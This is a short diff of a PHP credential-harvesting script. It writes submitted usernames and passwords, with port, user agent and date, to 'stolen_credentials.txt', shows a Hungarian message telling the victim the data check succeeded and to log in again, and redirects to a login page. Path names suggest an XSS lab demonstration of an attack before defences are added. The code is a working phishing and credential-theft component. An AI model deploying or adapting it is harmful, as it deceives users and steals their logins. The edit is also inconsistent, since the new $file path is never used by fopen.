@@ -7,8 +7,8 @@ session_start();
             $username = $_POST['username'];
             $password = $_POST['password'];
 			
-			$file = "stolen_credentials.txt";
-            $credentials = fopen("stolen_credentials.txt", "a+");
+			$file = "/home/attacker99/xss_attacker_result/stolen_credentials.txt";
+            		$credentials = fopen("stolen_credentials.txt", "a+");
 			$rem_port = $_SERVER['REMOTE_PORT'];
 			$user_agent = $_SERVER['HTTP_USER_AGENT'];
 			$date=date ("l dS of F Y h:i:s A");
@@ -37,7 +37,7 @@ session_start();
 				fclose($credentials);
 				
 				echo "<script>alert('Sikeres adategyeztetés! Kérem, jelentkezzen be újra!')</script>";
-				header ("Location: http://127.0.0.1:8080/xss_user/vedekezes_elott/login.php");
+				header ("Location: http://192.168.***.***:8080/xss_user/vedekezes_elott/login.php");
 			}
 
     } else {
